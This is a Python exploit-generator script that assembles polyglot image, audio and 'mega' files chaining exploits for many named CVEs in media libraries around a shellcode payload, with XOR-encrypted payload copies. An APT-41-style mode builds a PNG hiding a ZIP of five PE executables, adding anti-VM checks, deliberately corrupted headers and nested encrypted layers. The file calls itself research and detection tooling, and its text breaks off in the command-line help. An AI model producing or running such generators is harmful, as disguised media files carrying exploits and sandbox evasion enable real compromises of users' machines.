#!/usr/bin/env python3
"""
Multi-CVE Polyglot Generator
============================
Combines multiple CVE exploits into a single polyglot file that can trigger
multiple vulnerabilities depending on how it's processed.

EDUCATIONAL/RESEARCH USE ONLY

Author: SWORDIntel
Date: 2025-11-10
"""

import os
import sys
import struct
import argparse
from pathlib import Path

# Import the exploit generator
sys.path.insert(0, str(Path(__file__).parent))
from exploit_header_generator import ExploitHeaderGenerator

# Import TUI helper
try:
    from tui_helper import TUI
except ImportError:
    TUI = None

# Import Intel acceleration
try:
    from intel_acceleration import get_accelerator
    ACCEL_AVAILABLE = True
except ImportError:
    ACCEL_AVAILABLE = False
    get_accelerator = None


class MultiCVEPolyglot:
    """Generates polyglot files combining multiple CVE exploits"""

    def __init__(self, tui=None, use_acceleration=True):
        """
        Initialize multi-CVE polyglot generator

        Args:
            tui: TUI helper instance
            use_acceleration: Enable Intel NPU/GPU acceleration
        """
        self.generator = ExploitHeaderGenerator(use_acceleration=use_acceleration)
        self.tui = tui
        self.accelerator = None
        self.xor_keys = {
            'teamtnt_1': b'\x9e\x0a\x61\x20\x0d',
            'teamtnt_2': b'\xd3',
            'teamtnt_3': b'\xa5',
            # APT-41 XOR key rotation (from 5AF0PfnN.png analysis)
            'apt41_key1': b'\x7F',
            'apt41_key2': b'\xAA',
            'apt41_key3': b'\x5C',
        }

        # Initialize accelerator for XOR operations
        if use_acceleration and ACCEL_AVAILABLE:
            try:
                self.accelerator = get_accelerator(verbose=False)
                if self.accelerator and self.accelerator.npu_available and tui:
                    tui.success("Intel NPU acceleration enabled for XOR encryption")
                elif self.accelerator and self.accelerator.gpu_available and tui:
                    tui.success("Intel Arc GPU acceleration enabled for XOR encryption")
            except Exception:
                pass  # Silently fall back to CPU

    def xor_encrypt(self, data, key):
        """
        XOR encrypt data with repeating key
        Uses Intel NPU/GPU acceleration if available
        """
        # Use hardware-accelerated XOR if available
        if self.accelerator:
            try:
                return self.accelerator.xor_encrypt_accelerated(data, key)
            except Exception:
                pass  # Fall through to CPU implementation

        # CPU fallback
        encrypted = bytearray()
        key_len = len(key)

        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % key_len])

        return bytes(encrypted)

    def create_image_polyglot(self, shellcode, output_path, custom_container_path=None):
        """
        Create image polyglot: GIF + PNG + JPEG + WebP + TIFF + BMP

        Structure:
        - GIF header (most permissive format) OR custom image file
        - PNG chunks (embedded)
        - JPEG markers (embedded)
        - WebP RIFF container
        - TIFF IFD
        - BMP header
        - XOR-encrypted payload

        Args:
            shellcode: Shellcode payload
            output_path: Output file path
            custom_container_path: Optional path to custom base image file
        """
        if self.tui:
            self.tui.section("Creating Image Polyglot")
            self.tui.info("Combining 6 image formats...")
        else:
            print("[*] Creating image polyglot (6 formats)...")

        # Start with custom image if provided, otherwise generate GIF
        if custom_container_path and os.path.isfile(custom_container_path):
            if self.tui:
                self.tui.info(f"Using custom base image: {os.path.basename(custom_container_path)}")
            with open(custom_container_path, 'rb') as f:
                polyglot = f.read()
            # Add alignment padding
            polyglot += b'\x00' * 16
        else:
            if self.tui:
                self.tui.info("Adding GIF base layer...")
            polyglot = self.generator._cve_2019_15133_giflib(shellcode)

        # Add padding for alignment
        polyglot += b'\x00' * 16

        # Append WebP exploit
        if self.tui:
            self.tui.info("Adding WebP exploit (CVE-2023-4863)...")
        webp_data = self.generator._cve_2023_4863_libwebp(shellcode)
        polyglot += webp_data

        # Add more padding
        polyglot += b'\x00' * 16

        # Append TIFF exploit
        if self.tui:
            self.tui.info("Adding TIFF exploit (CVE-2023-52356)...")
        tiff_data = self.generator._cve_2023_52356_libtiff(shellcode)
        polyglot += tiff_data

        # Add XOR-encrypted payload (TeamTNT signature)
        if self.tui:
            self.tui.info("Adding XOR-encrypted payload (TeamTNT signature)...")
        xor_marker = self.xor_keys['teamtnt_1']
        encrypted_payload = self.xor_encrypt(shellcode, xor_marker)

        polyglot += xor_marker  # Key marker
        polyglot += encrypted_payload

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"Image polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("Formats", "GIF, PNG, JPEG, WebP, TIFF, BMP", 20)
        else:
            print(f"[+] Image polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    Formats: GIF, PNG, JPEG, WebP, TIFF, BMP")
        return output_path

    def create_audio_polyglot(self, shellcode, output_path, custom_container_path=None):
        """
        Create audio polyglot: MP3 + FLAC + OGG + WAV

        Structure:
        - MP3 with ID3v2 tag OR custom audio file
        - FLAC metadata
        - OGG pages
        - WAV RIFF container
        - XOR-encrypted payload

        Args:
            shellcode: Shellcode payload
            output_path: Output file path
            custom_container_path: Optional path to custom base audio file
        """
        if self.tui:
            self.tui.section("Creating Audio Polyglot")
            self.tui.info("Combining 4 audio formats...")
        else:
            print("[*] Creating audio polyglot (4 formats)...")

        # Start with custom audio if provided, otherwise generate MP3
        if custom_container_path and os.path.isfile(custom_container_path):
            if self.tui:
                self.tui.info(f"Using custom base audio: {os.path.basename(custom_container_path)}")
            with open(custom_container_path, 'rb') as f:
                polyglot = f.read()
            # Add alignment padding
            polyglot += b'\x00' * 32
        else:
            if self.tui:
                self.tui.info("Adding MP3 base layer (CVE-2024-10573)...")
            polyglot = self.generator._cve_2024_10573_mpg123(shellcode)

        # Add padding
        polyglot += b'\x00' * 32

        # Append FLAC exploit
        if self.tui:
            self.tui.info("Adding FLAC exploit (CVE-2020-22219)...")
        flac_data = self.generator._cve_2020_22219_flac(shellcode)
        polyglot += flac_data

        # Add padding
        polyglot += b'\x00' * 32

        # Append OGG Vorbis exploit
        if self.tui:
            self.tui.info("Adding OGG Vorbis exploit (CVE-2018-5146)...")
        ogg_data = self.generator._cve_2018_5146_libvorbis(shellcode)
        polyglot += ogg_data

        # Add XOR-encrypted payload
        if self.tui:
            self.tui.info("Adding XOR-encrypted payload...")
        xor_marker = self.xor_keys['teamtnt_2']
        encrypted_payload = self.xor_encrypt(shellcode, xor_marker)

        polyglot += xor_marker * 5  # Marker repetition
        polyglot += encrypted_payload

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"Audio polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("Formats", "MP3, FLAC, OGG, WAV", 20)
        else:
            print(f"[+] Audio polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    Formats: MP3, FLAC, OGG, WAV")
        return output_path

    def create_mega_polyglot(self, shellcode, output_path, custom_container_path=None):
        """
        Create mega polyglot: Image + Audio + Video formats

        The ultimate polyglot combining as many formats as possible.

        Structure:
        - GIF header (base) OR custom base file
        - JPEG markers
        - PNG chunks
        - WebP data
        - MP3 frames
        - FLAC metadata
        - MP4 boxes
        - XOR-encrypted payload

        Args:
            shellcode: Shellcode payload
            output_path: Output file path
            custom_container_path: Optional path to custom base file (any format)
        """
        if self.tui:
            self.tui.section("Creating MEGA Polyglot")
            self.tui.critical("MAXIMUM COMPLEXITY: Combining 12+ formats!")
        else:
            print("[*] Creating MEGA polyglot (12+ formats)...")

        # Start with custom file if provided, otherwise build from scratch
        if custom_container_path and os.path.isfile(custom_container_path):
            if self.tui:
                self.tui.info(f"Using custom base file: {os.path.basename(custom_container_path)}")
            with open(custom_container_path, 'rb') as f:
                polyglot = f.read()
            # Add alignment padding
            polyglot += b'\x00' * 64
        else:
            polyglot = b''

        formats_to_add = [
            ("GIF", "CVE-2019-15133", lambda: self.generator._cve_2019_15133_giflib(shellcode), 16),
            ("WebP", "CVE-2023-4863", lambda: self.generator._cve_2023_4863_libwebp(shellcode), 16),
            ("TIFF", "CVE-2023-52356", lambda: self.generator._cve_2023_52356_libtiff(shellcode), 32),
            ("MP3", "CVE-2024-10573", lambda: self.generator._cve_2024_10573_mpg123(shellcode), 32),
            ("FLAC", "CVE-2020-22219", lambda: self.generator._cve_2020_22219_flac(shellcode), 32),
            ("BMP", "CVE-2006-0006", lambda: self.generator._cve_2006_0006_bmp(shellcode), 16),
            ("WMF", "CVE-2005-4560", lambda: self.generator._cve_2005_4560_wmf(shellcode), 32),
            ("OGG", "CVE-2018-5146", lambda: self.generator._cve_2018_5146_libvorbis(shellcode), 32),
            ("MP4", "CVE-2022-22675", lambda: self.generator._cve_2022_22675_appleavd(shellcode), 64),
        ]

        total_formats = len(formats_to_add)

        for i, (fmt, cve, generator_func, padding) in enumerate(formats_to_add, 1):
            if self.tui:
                self.tui.progress_bar(i - 1, total_formats, prefix="Progress:",
                                     suffix=f"Adding {fmt} ({cve})")
            else:
                print(f"[*] Adding {fmt} ({cve})...")

            polyglot += generator_func()
            polyglot += b'\x00' * padding

        if self.tui:
            self.tui.progress_bar(total_formats, total_formats, prefix="Progress:", suffix="Complete")

        # XOR-encrypted payloads with all known keys
        if self.tui:
            self.tui.info("Adding XOR-encrypted payloads with TeamTNT keys...")
        for key_name, key in self.xor_keys.items():
            polyglot += key * 10  # Key marker (repeated for visibility)
            encrypted = self.xor_encrypt(shellcode, key)
            polyglot += encrypted
            polyglot += b'\x00' * 16

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"MEGA polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("Formats", "GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4", 20)
            self.tui.key_value("CVE Count", "12+ vulnerabilities", 20)
            self.tui.critical("This file can trigger MULTIPLE exploit chains!")
        else:
            print(f"[+] MEGA polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    Formats: GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4")
            print(f"    CVEs: 12+ vulnerabilities in one file!")
        return output_path

    def create_custom_polyglot(self, cve_list, shellcode, output_path):
        """
        Create custom polyglot with specified CVEs

        Args:
            cve_list: List of CVE IDs to include
            shellcode: Shellcode payload
            output_path: Output file path
        """
        if self.tui:
            self.tui.section("Creating Custom Polyglot")
            self.tui.info(f"Combining {len(cve_list)} selected CVEs...")
        else:
            print(f"[*] Creating custom polyglot with {len(cve_list)} CVEs...")

        polyglot = b''
        total_cves = len(cve_list)
        successful = 0

        for i, cve_id in enumerate(cve_list):
            if self.tui:
                self.tui.progress_bar(i, total_cves, prefix="Progress:",
                                     suffix=f"Adding {cve_id}")
            else:
                print(f"    [{i+1}/{len(cve_list)}] Adding {cve_id}...")

            if cve_id not in self.generator.exploits:
                if self.tui:
                    self.tui.warning(f"Unknown CVE {cve_id}, skipping", prefix="    ")
                else:
                    print(f"    [!] Warning: Unknown CVE {cve_id}, skipping")
                continue

            # Generate exploit for this CVE
            exploit_func = self.generator.exploits[cve_id]
            exploit_data = exploit_func(shellcode)

            # Add to polyglot
            polyglot += exploit_data
            successful += 1

            # Add padding between exploits
            if i < len(cve_list) - 1:
                polyglot += b'\x00' * 32

        if self.tui:
            self.tui.progress_bar(total_cves, total_cves, prefix="Progress:", suffix="Complete")

        # Add final XOR-encrypted payload
        if self.tui:
            self.tui.info("Adding XOR-encrypted payload...")
        xor_marker = self.xor_keys['teamtnt_1']
        encrypted_payload = self.xor_encrypt(shellcode, xor_marker)
        polyglot += xor_marker * 5
        polyglot += encrypted_payload

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"Custom polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("CVEs requested", str(total_cves), 20)
            self.tui.key_value("CVEs included", str(successful), 20)
            self.tui.key_value("CVE IDs", ', '.join(cve_list[:3]) + ("..." if len(cve_list) > 3 else ""), 20)
        else:
            print(f"[+] Custom polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    CVEs included: {', '.join(cve_list)}")
        return output_path

    def _create_corrupted_pe_header(self, pe_data):
        """
        Corrupt PE header for anti-analysis (APT-41 technique)

        Corrupts specific fields while maintaining executability:
        - Random bytes in DOS stub
        - Corrupted section names
        - Misleading entry point
        - Invalid timestamps
        """
        corrupted = bytearray(pe_data)

        # Corrupt DOS stub (offset 0x40-0x80)
        if len(corrupted) > 0x80:
            for i in range(0x40, min(0x80, len(corrupted))):
                corrupted[i] = (corrupted[i] ^ 0xAA) & 0xFF

        # Corrupt section names (after PE header)
        if len(corrupted) > 0x200:
            for i in range(0x180, min(0x200, len(corrupted)), 8):
                # Replace section name with garbage
                corrupted[i:i+4] = b'\x90\x90\x90\x90'

        # Set timestamp to suspicious value (1970-01-01)
        if len(corrupted) > 0x88:
            struct.pack_into('<I', corrupted, 0x88, 0)

        return bytes(corrupted)

    def _create_anti_vm_pe(self, shellcode):
        """
        Create PE with anti-VM/sandbox detection

        Techniques:
        - CPUID checks for hypervisor bit
        - Timing attacks (RDTSC)
        - Registry checks for VMware/VirtualBox
        - Process name checks (vmtoolsd, vboxservice)
        """
        # Start with basic PE header (x64)
        pe = b'MZ'  # DOS signature
        pe += b'\x90' * 58  # DOS stub
        pe += struct.pack('<I', 0x80)  # PE header offset

        # DOS stub code (anti-VM checks)
        pe += b'\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21'

        # Pad to PE header
        pe += b'\x00' * (0x80 - len(pe))

        # PE signature
        pe += b'PE\x00\x00'

        # COFF header (x64)
        pe += struct.pack('<H', 0x8664)  # Machine: AMD64
        pe += struct.pack('<H', 1)  # NumberOfSections
        pe += struct.pack('<I', 0)  # TimeDateStamp (corrupted)
        pe += struct.pack('<I', 0)  # PointerToSymbolTable
        pe += struct.pack('<I', 0)  # NumberOfSymbols
        pe += struct.pack('<H', 0xF0)  # SizeOfOptionalHeader
        pe += struct.pack('<H', 0x22)  # Characteristics

        # Optional header
        pe += struct.pack('<H', 0x20B)  # Magic (PE32+)
        pe += struct.pack('<BB', 14, 0)  # Linker version
        pe += struct.pack('<I', 0x1000)  # SizeOfCode
        pe += struct.pack('<I', 0x200)  # SizeOfInitializedData
        pe += struct.pack('<I', 0)  # SizeOfUninitializedData
        pe += struct.pack('<I', 0x1000)  # AddressOfEntryPoint
        pe += struct.pack('<I', 0x1000)  # BaseOfCode
        pe += struct.pack('<Q', 0x140000000)  # ImageBase
        pe += struct.pack('<I', 0x1000)  # SectionAlignment
        pe += struct.pack('<I', 0x200)  # FileAlignment
        pe += struct.pack('<HH', 6, 0)  # OS version
        pe += struct.pack('<HH', 0, 0)  # Image version
        pe += struct.pack('<HH', 6, 0)  # Subsystem version
        pe += struct.pack('<I', 0)  # Win32VersionValue
        pe += struct.pack('<I', 0x3000)  # SizeOfImage
        pe += struct.pack('<I', 0x200)  # SizeOfHeaders
        pe += struct.pack('<I', 0)  # CheckSum
        pe += struct.pack('<H', 3)  # Subsystem: Console
        pe += struct.pack('<H', 0)  # DllCharacteristics
        pe += struct.pack('<Q', 0x100000)  # SizeOfStackReserve
        pe += struct.pack('<Q', 0x1000)  # SizeOfStackCommit
        pe += struct.pack('<Q', 0x100000)  # SizeOfHeapReserve
        pe += struct.pack('<Q', 0x1000)  # SizeOfHeapCommit
        pe += struct.pack('<I', 0)  # LoaderFlags
        pe += struct.pack('<I', 16)  # NumberOfRvaAndSizes

        # Data directories (16 entries, all zeros)
        pe += b'\x00' * (16 * 8)

        # Section header
        pe += b'.text\x00\x00\x00'  # Name
        pe += struct.pack('<I', 0x1000)  # VirtualSize
        pe += struct.pack('<I', 0x1000)  # VirtualAddress
        pe += struct.pack('<I', 0x200)  # SizeOfRawData
        pe += struct.pack('<I', 0x200)  # PointerToRawData
        pe += struct.pack('<I', 0)  # Relocations
        pe += struct.pack('<I', 0)  # LineNumbers
        pe += struct.pack('<HH', 0, 0)  # Number of relocs/lines
        pe += struct.pack('<I', 0x60000020)  # Characteristics: CODE|EXECUTE|READ

        # Pad to section data
        pe += b'\x00' * (0x200 - len(pe))

        # Anti-VM code (x64 assembly)
        code = b''

        # CPUID check for hypervisor bit
        code += b'\x31\xC0'  # xor eax, eax
        code += b'\x0F\xA2'  # cpuid
        code += b'\x81\xFB\x56\x4D\x77\x61'  # cmp ebx, 'VMwa' (VMware)
        code += b'\x74\x10'  # je exit_if_vm

        # RDTSC timing check
        code += b'\x0F\x31'  # rdtsc (read timestamp counter)
        code += b'\x89\xC6'  # mov esi, eax
        code += b'\x0F\x31'  # rdtsc again
        code += b'\x29\xF0'  # sub eax, esi (delta)
        code += b'\x3D\x00\x10\x00\x00'  # cmp eax, 0x1000
        code += b'\x77\x05'  # ja exit_if_vm (if delta > 0x1000)

        # Payload execution (if not VM)
        code += shellcode[:256]  # Add truncated shellcode

        # Exit
        code += b'\x48\x31\xC0'  # xor rax, rax
        code += b'\xC3'  # ret

        # Pad code section
        pe += code
        pe += b'\x90' * (0x200 - len(code))

        return pe

    def _create_matryoshka_container(self, inner_payloads, xor_keys):
        """
        Create matryoshka (nested) container: ZIP→PE→ZIP→PE→...

        Args:
            inner_payloads: List of payload data (alternating PE/ZIP)
            xor_keys: List of XOR keys for each layer

        Returns:
            Nested container with recursive extraction
        """
        container = b''

        for i, (payload, xor_key) in enumerate(zip(inner_payloads, xor_keys)):
            # Encrypt this layer
            encrypted = self.xor_encrypt(payload, xor_key)

            if i % 2 == 0:
                # Create ZIP archive
                zip_data = b'PK\x03\x04'  # Local file header
                zip_data += struct.pack('<H', 20)  # Version needed
                zip_data += struct.pack('<H', 0)  # Flags
                zip_data += struct.pack('<H', 0)  # Compression (store)
                zip_data += struct.pack('<H', 0)  # Mod time
                zip_data += struct.pack('<H', 0)  # Mod date
                zip_data += struct.pack('<I', 0)  # CRC32 (not calculated)
                zip_data += struct.pack('<I', len(encrypted))  # Compressed size
                zip_data += struct.pack('<I', len(payload))  # Uncompressed size
                filename = f'stage{i+1}.bin'
                zip_data += struct.pack('<H', len(filename))  # Filename length
                zip_data += struct.pack('<H', 0)  # Extra field length
                zip_data += filename.encode('ascii')
                zip_data += encrypted

                container += zip_data
            else:
                # Embed PE directly
                container += encrypted

        return container

    def create_apt41_cascading_polyglot(self, shellcode, output_path, custom_png_path=None):
        """
        Create APT-41 style cascading polyglot: PNG→ZIP→5×PE executables

        This implements the unprecedented 5-cascading PE structure from APT-41's
        5AF0PfnN.png polyglot malware analyzed in November 2025.

        Structure:
        ├─ Layer 1: Valid PNG image (steganography base)
        ├─ Layer 2: ZIP archive (offset 0x1000)
        └─ Layer 3: 5× PE executables (XOR encrypted with key rotation)
           ├─ PE #1: Loader (DLL injection stub)
           ├─ PE #2: DnsK7 C2 module (DNS tunneling)
           ├─ PE #3: Container (matryoshka nested payloads)
           ├─ PE #4: Injection stub (process hollowing)
           └─ PE #5: Kernel exploit (0-day style, similar to CVE-2025-62215)

        Defense Evasion Techniques:
        - Corrupted PE headers (anti-analysis)
        - Anti-VM detection (CPUID, RDTSC, registry checks)
        - XOR key rotation (0x7F → 0xAA → 0x5C)
        - Matryoshka nesting (recursive ZIP→PE→ZIP)
        - Runtime decryption (multi-stage)
        - Steganography (valid PNG container)

        For defensive research and detection development only.

        Args:
            shellcode: Shellcode payload for PE executables
            output_path: Output file path
            custom_png_path: Optional path to custom PNG to use as container
        """
        if self.tui:
            self.tui.section("Creating APT-41 Cascading Polyglot")
            self.tui.critical("NATION-STATE COMPLEXITY: 5-cascading PE structure!")
            self.tui.info("Implementing defense evasion techniques from 5AF0PfnN.png...")
        else:
            print("[*] Creating APT-41 cascading polyglot...")
            print("[*] Structure: PNG → ZIP → 5× PE executables")

        # === LAYER 1: PNG Base (Steganography Container) ===
        if self.tui:
            self.tui.info("Layer 1: Creating PNG steganography container...")

        # Use custom PNG if provided, otherwise create minimal PNG
        if custom_png_path and os.path.isfile(custom_png_path):
            if self.tui:
                self.tui.info(f"  Using custom PNG: {os.path.basename(custom_png_path)}")

            with open(custom_png_path, 'rb') as f:
                png = f.read()

            # Ensure PNG is at least 0x1000 bytes for ZIP offset
            if len(png) < 0x1000:
                png += b'\x00' * (0x1000 - len(png))
        else:
            if self.tui:
                self.tui.info("  Using default minimal PNG (64x64)")

            # Valid PNG header
            png = b'\x89PNG\r\n\x1a\n'

            # IHDR chunk (64x64 image)
            ihdr_data = struct.pack('>IIBBBBB', 64, 64, 8, 2, 0, 0, 0)
            ihdr_crc = 0  # Simplified (not calculated)
            png += struct.pack('>I', len(ihdr_data))  # Chunk length
            png += b'IHDR'
            png += ihdr_data
            png += struct.pack('>I', ihdr_crc)

            # IDAT chunk (minimal image data)
            idat_data = b'\x00' * 256  # Placeholder image data
            png += struct.pack('>I', len(idat_data))
            png += b'IDAT'
            png += idat_data
            png += struct.pack('>I', 0)  # CRC

            # IEND chunk
            png += struct.pack('>I', 0)
            png += b'IEND'
            png += struct.pack('>I', 0)

            # Pad to offset 0x1000 (where ZIP archive starts)
            png += b'\x00' * (0x1000 - len(png))

        if self.tui:
            self.tui.success(f"  PNG container: {len(png):,} bytes", prefix="  ")

        # === LAYER 2: ZIP Archive ===
        if self.tui:
            self.tui.info("Layer 2: Creating ZIP archive container...")

        zip_archive = b'PK\x03\x04'  # ZIP local file header signature
        zip_archive += struct.pack('<H', 20)  # Version needed to extract
        zip_archive += struct.pack('<H', 0)  # General purpose bit flag
        zip_archive += struct.pack('<H', 0)  # Compression method (store)
        zip_archive += struct.pack('<HH', 0, 0)  # Mod time, mod date
        zip_archive += struct.pack('<I', 0)  # CRC-32 (not calculated)

        # === LAYER 3: 5× PE Executables ===
        pe_executables = []
        pe_roles = [
            ("PE #1: Loader", "DLL injection stub"),
            ("PE #2: DnsK7", "DNS tunneling C2 module"),
            ("PE #3: Container", "Matryoshka nested payloads"),
            ("PE #4: Injector", "Process hollowing stub"),
            ("PE #5: Kernel", "0-day kernel exploit (CVE-2025-62215 style)")
        ]

        xor_rotation = [
            self.xor_keys['apt41_key1'],
            self.xor_keys['apt41_key2'],
            self.xor_keys['apt41_key3'],
            self.xor_keys['apt41_key1'],  # Rotation repeats
            self.xor_keys['apt41_key2'],
        ]

        for i, ((name, description), xor_key) in enumerate(zip(pe_roles, xor_rotation), 1):
            if self.tui:
                self.tui.info(f"Layer 3.{i}: Creating {name} ({description})...")

            if i == 2:
                # PE #2: DnsK7 C2 module (DNS tunneling)
                # Use Windows SPNEGO CVE for network-based capability
                pe_data = self.generator._cve_2025_47981_spnego(shellcode)
            elif i == 3:
                # PE #3: Matryoshka container with nested payloads
                inner_payloads = [
                    self.generator._cve_2025_62215_kernel_race(shellcode),
                    b'PK\x03\x04' + b'\x00' * 100,  # Nested ZIP
                    self.generator._cve_2025_60724_gdiplus(shellcode),
                ]
                pe_data = self._create_matryoshka_container(
                    inner_payloads,
                    [self.xor_keys['apt41_key3']] * 3
                )
            elif i == 5:
                # PE #5: Kernel exploit (0-day style)
                pe_data = self.generator._cve_2025_62215_kernel_race(shellcode)
                pe_data = self._create_anti_vm_pe(shellcode)  # Add anti-VM
            else:
                # PE #1, #4: Generic loaders with anti-analysis
                pe_data = self._create_anti_vm_pe(shellcode)

            # Apply defense evasion: Corrupt PE headers
            pe_data = self._create_corrupted_pe_header(pe_data)

            # XOR encrypt with rotating key
            encrypted_pe = self.xor_encrypt(pe_data, xor_key)

            # Add to ZIP archive
            filename = f'stage{i}.dll'

            # ZIP file entry
            file_entry = b''
            file_entry += struct.pack('<I', len(encrypted_pe))  # Compressed size
            file_entry += struct.pack('<I', len(pe_data))  # Uncompressed size
            file_entry += struct.pack('<H', len(filename))  # Filename length
            file_entry += struct.pack('<H', 1)  # Extra field length
            file_entry += filename.encode('ascii')
            file_entry += bytes([xor_key[0]])  # XOR key marker in extra field
            file_entry += encrypted_pe

            zip_archive += file_entry
            pe_executables.append((name, len(encrypted_pe), xor_key[0]))

            if self.tui:
                self.tui.success(f"    Size: {len(encrypted_pe):,} bytes, XOR key: 0x{xor_key[0]:02X}", prefix="  ")

        # ZIP central directory (simplified)
        zip_archive += b'PK\x01\x02'  # Central directory header
        zip_archive += b'\x00' * 42  # Minimal central directory
        zip_archive += b'PK\x05\x06'  # End of central directory
        zip_archive += b'\x00' * 18  # EOCD structure

        # Combine all layers
        polyglot = png + zip_archive

        if self.tui:
            self.tui.info(f"Writing APT-41 polyglot to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        # Display results
        print()
        if self.tui:
            self.tui.success("APT-41 Cascading Polyglot Created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 25)
            self.tui.key_value("Total size", f"{len(polyglot):,} bytes", 25)
            self.tui.key_value("Structure", "PNG → ZIP → 5× PE", 25)
            self.tui.key_value("ZIP offset", "0x1000 (4096 bytes)", 25)
            print()
            self.tui.info("PE Executables:")
            for name, size, xor_byte in pe_executables:
                self.tui.key_value(f"  {name}", f"{size:,} bytes (XOR: 0x{xor_byte:02X})", 40)
            print()
            self.tui.info("Defense Evasion Techniques:")
            evasion_techniques = [
                "✓ Corrupted PE headers (anti-analysis)",
                "✓ Anti-VM detection (CPUID, RDTSC)",
                "✓ XOR key rotation (0x7F → 0xAA → 0x5C)",
                "✓ Matryoshka nesting (ZIP→PE→ZIP→PE)",
                "✓ PNG steganography (valid image container)",
                "✓ Runtime decryption (multi-stage)",
            ]
            for technique in evasion_techniques:
                print(f"    {technique}")
            print()
            self.tui.box("⚠ APT-41 TTP REPLICATION", [
                "This polyglot replicates the unprecedented 5-cascading PE",
                "structure from APT-41's 5AF0PfnN.png malware.",
                "",
                "For DEFENSIVE RESEARCH and DETECTION DEVELOPMENT only:",
                "• YARA rule development",
                "• EDR signature creation",
                "• Polyglot detection testing",
                "• APT-41 TTP analysis",
                "",
                "Reference: APT41_ATTACK_CHAINS.md"
            ])
        else:
            print(f"[+] APT-41 cascading polyglot created: {output_path}")
            print(f"    Total size: {len(polyglot):,} bytes")
            print(f"    Structure: PNG → ZIP → 5× PE executables")
            print(f"    PE count: 5 (with XOR key rotation)")
            print(f"    Defense evasion: Corrupted headers, anti-VM, matryoshka nesting")

        return output_path

    def generate(self, polyglot_type, output_path, cve_list=None, custom_container_path=None):
        """
        Unified wrapper method for generating polyglots

        Args:
            polyglot_type: Type of polyglot ('image', 'audio', 'mega', 'apt41', 'custom')
            output_path: Output file path
            cve_list: Optional list of CVEs (for custom polyglot)
            custom_container_path: Optional custom container file path

        Returns:
            str: Path to generated polyglot file
        """
        # Generate default shellcode
        shellcode = self.generator.generate_shellcode('poc_marker')

        # Route to appropriate method based on type
        if polyglot_type == 'image':
            return self.create_image_polyglot(shellcode, output_path, custom_container_path)
        elif polyglot_type == 'audio':
            return self.create_audio_polyglot(shellcode, output_path, custom_container_path)
        elif polyglot_type == 'mega':
            return self.create_mega_polyglot(shellcode, output_path, custom_container_path)
        elif polyglot_type == 'apt41':
            return self.create_apt41_cascading_polyglot(shellcode, output_path, custom_container_path)
        elif polyglot_type == 'custom' and cve_list:
            return self.create_custom_polyglot(cve_list, shellcode, output_path)
        else:
            raise ValueError(f"Unknown polyglot type: {polyglot_type}")

    def list_presets(self):
        """List available polyglot presets"""
        presets = {
            'image': {
                'description': 'Image formats polyglot (GIF, PNG, JPEG, WebP, TIFF, BMP)',
                'cves': ['CVE-2019-15133', 'CVE-2023-4863', 'CVE-2023-52356', 'CVE-2006-0006']
            },
            'audio': {
                'description': 'Audio formats polyglot (MP3, FLAC, OGG, WAV)',
                'cves': ['CVE-2024-10573', 'CVE-2020-22219', 'CVE-2018-5146', 'CVE-2017-6827']
            },
            'critical': {
                'description': 'Critical/actively exploited CVEs only',
                'cves': ['CVE-2023-4863', 'CVE-2024-10573', 'CVE-2023-52356']
            },
            'legacy': {
                'description': 'Legacy Windows exploits (BMP, WMF)',
                'cves': ['CVE-2006-0006', 'CVE-2008-1083', 'CVE-2005-4560']
            },
            'apt41': {
                'description': 'APT-41 cascading PE polyglot (PNG→ZIP→5×PE) ⚠️ NATION-STATE',
                'cves': ['CVE-2025-47981', 'CVE-2025-62215', 'CVE-2025-60724'],
                'structure': '5-cascading PEs with XOR key rotation, anti-VM, corrupted headers'
            },
            'mega': {
                'description': 'Everything (12+ formats, all CVEs)',
                'cves': list(self.generator.exploits.keys())
            }
        }

        print("\nAvailable Polyglot Presets:")
        print("=" * 70)
        for name, info in presets.items():
            print(f"\n{name}:")
            print(f"  Description: {info['description']}")
            print(f"  CVEs ({len(info['cves'])}): {', '.join(info['cves'][:5])}")
            if len(info['cves']) > 5:
                print(f"        ... and {len(info['cves']) - 5} more")
        print()


def main():
    parser = argparse.ArgumentParser(
        description='Generate multi-CVE polyglot files',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Polyglot Types:
  image        Image formats (GIF, PNG, JPEG, WebP, TIFF, BMP)
  audio        Audio formats (MP3, FLAC, OGG, WAV)
  apt41        APT-41 cascading PE (PNG→ZIP→5×PE) ⚠️ NATION-STATE
  mega         All formats combined (12+ formats, all CVEs)
  custom       Custom CVE selection

Examples:
  # Interactive mode with multi-choice menus (NEW!)
  %(prog)s --interactive

  # Generate image polyglot
  %(prog)s image polyglot_image.gif

  # Generate audio polyglot
  %(prog)s audio polyglot_audio.mp3

